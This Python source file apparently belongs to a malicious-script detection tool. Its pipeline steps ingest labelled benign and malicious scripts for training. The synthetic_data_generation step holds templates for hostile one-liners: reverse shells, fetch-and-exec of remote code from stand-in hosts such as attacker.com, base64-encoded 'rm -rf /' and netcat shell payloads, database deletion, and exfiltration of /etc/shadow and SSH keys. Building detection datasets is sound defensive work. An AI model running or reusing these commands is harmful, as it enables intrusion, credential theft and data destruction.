import os
import requests
import glob
from typing import List, Dict, Any, Optional
from zenml import step
from scriptguard.utils.logger import logger
import random

def fetch_github_file(url: str) -> Optional[str]:
    """Helper to fetch raw content from a GitHub URL."""
    # Convert github.com URL to raw.githubusercontent.com if needed
    raw_url = url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
    try:
        response = requests.get(raw_url, timeout=10)
        if response.status_code == 200:
            return response.text
    except Exception as e:
        logger.error(f"Failed to fetch {url}: {e}")
    return None

@step
def github_data_ingestion(
    malicious_urls: List[str], 
    benign_urls: List[str]
) -> List[Dict[str, Any]]:
    """
    Ingests scripts from GitHub, explicitly labeling them.
    """
    logger.info(f"Ingesting {len(malicious_urls)} malicious and {len(benign_urls)} benign GitHub files.")
    data = []
    
    # Process malicious
    for url in malicious_urls:
        content = fetch_github_file(url)
        if content:
            data.append({"content": content, "label": "malicious", "source": url})
            
    # Process benign
    for url in benign_urls:
        content = fetch_github_file(url)
        if content:
            data.append({"content": content, "label": "benign", "source": url})
            
    return data

@step
def local_data_ingestion(
    malicious_dir: Optional[str] = None, 
    benign_dir: Optional[str] = None
) -> List[Dict[str, Any]]:
    """
    Ingests scripts from local directories with explicit labels based on path.
    Enforces strict Python file validation.
    """
    from scriptguard.utils.file_validator import validate_python_file

    data = []
    stats = {
        "total_files": 0,
        "valid_files": 0,
        "rejected_files": 0,
        "rejection_reasons": {}
    }

    def ingest_from_path(path: str, label: str):
        if not os.path.exists(path):
            logger.warning(f"Path {path} does not exist.")
            return
        
        # Only process .py files (strict gatekeeper)
        files = glob.glob(os.path.join(path, "**", "*.py"), recursive=True)

        for file_path in files:
            stats["total_files"] += 1

            # Strict validation
            is_valid, content, metadata = validate_python_file(file_path)

            if is_valid:
                data.append({
                    "content": content,
                    "label": label,
                    "source": file_path,
                    "metadata": metadata
                })
                stats["valid_files"] += 1
            else:
                stats["rejected_files"] += 1
                error = metadata.get("error", "unknown")
                stats["rejection_reasons"][error] = stats["rejection_reasons"].get(error, 0) + 1
                logger.debug(f"Rejected {file_path}: {error}")

    if malicious_dir:
        ingest_from_path(malicious_dir, "malicious")
    if benign_dir:
        ingest_from_path(benign_dir, "benign")

    # Log statistics
    logger.info(f"Local ingestion stats:")
    logger.info(f"  Total files scanned: {stats['total_files']}")
    logger.info(f"  Valid files: {stats['valid_files']}")
    logger.info(f"  Rejected files: {stats['rejected_files']}")
    if stats["rejection_reasons"]:
        logger.info("  Rejection reasons:")
        for reason, count in stats["rejection_reasons"].items():
            logger.info(f"    - {reason}: {count}")

    return data

@step
def generic_web_ingestion(urls: List[str]) -> List[Dict[str, Any]]:
    """
    Ingests scripts from generic web URLs.
    """
    logger.info(f"Ingesting data from {len(urls)} web URLs.")
    data = []
    for url in urls:
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data.append({
                    "content": response.text,
                    "label": "unknown", # Needs manual labeling or heuristic
                    "source": url
                })
        except Exception as e:
            logger.error(f"Failed to fetch {url}: {e}")
    return data

@step
def synthetic_data_generation(base_data: List[Dict[str, Any]], num_samples: int = 10) -> List[Dict[str, Any]]:
    """
    Augments the dataset by generating randomized synthetic malicious scripts.
    """
    logger.info(f"Generating {num_samples} synthetic malicious scripts.")
    synthetic_scripts = []
    
    templates = [
        "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')",
        "import base64,os;os.system(base64.b64decode('{b64_payload}').decode())",
        "import requests;r=requests.get('{url}');exec(r.text)",
        "import subprocess;subprocess.Popen(['/bin/bash', '-c', 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'])",
        "import os;[os.remove(f) for f in os.listdir('{path}') if f.endswith('.db')]",
        "import requests;data=open('{sensitive_file}', 'rb').read();requests.post('{exfil_url}', data=data)"
    ]
    
    ips = ["192.168.1.50", "10.0.0.1", "45.77.12.33", "172.16.0.5"]
    ports = [4444, 8080, 1337, 8888]
    urls = ["http://attacker.com/payload.py", "http://malware.xyz/update", "http://1.1.1.1/shell"]
    paths = ["/etc/", "/var/log/", "./config/"]
    sensitive_files = ["/etc/passwd", "~/.ssh/id_rsa", "/etc/shadow"]
    
    for _ in range(num_samples):
        template = random.choice(templates)
        content = template.format(
            ip=random.choice(ips),
            port=random.choice(ports),
            b64_payload=random.choice(["YmFzaCAtaSA+", "cm0gLXJmIC8=", "bmV0Y2F0IC1lIC9iaW4vc2ggMTAuMC4wLjEgNDQ0NA=="]),
            url=random.choice(urls),
            path=random.choice(paths),
            sensitive_file=random.choice(sensitive_files),
            exfil_url=random.choice(urls)
        )
        
        synthetic_scripts.append({
            "content": content,
            "label": "malicious",
            "source": "synthetic_generator"
        })
    
    return base_data + synthetic_scripts
